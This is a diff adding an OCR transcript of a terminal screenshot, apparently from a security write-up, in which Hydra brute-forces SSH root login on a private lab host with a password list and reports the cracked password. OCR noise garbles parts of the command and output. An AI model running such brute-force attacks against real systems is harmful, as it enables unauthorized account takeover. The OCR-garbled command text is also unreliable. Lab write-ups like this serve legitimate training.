@@ -1,0 +1,16 @@
+# OCR: ece37bd1d4d135c0b456491f22145331.jpg
+# 来源: .\02-WriteUp\2024\ece37bd1d4d135c0b456491f22145331.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:45
+
+[ 一 (reoteksti) -[~/ 柯 面 ]
+“ hydra - root -P commonPud.txt sShi//192.168.8.142
+Hydra v9.5 (c) 2023 by van Hauser/THC 6 David Maciejak - Please do not use in military 0
+nd ethics anyway).
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-27 20:51:14
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended ,
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 147 login tries (1:1/p:147), ~10 tri
+[DATA] attacking ssh://192.168.8.142:22/
+[22][ssh] host: 192.168.8.142 login: root password: h1@7001
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-27 20:51:19
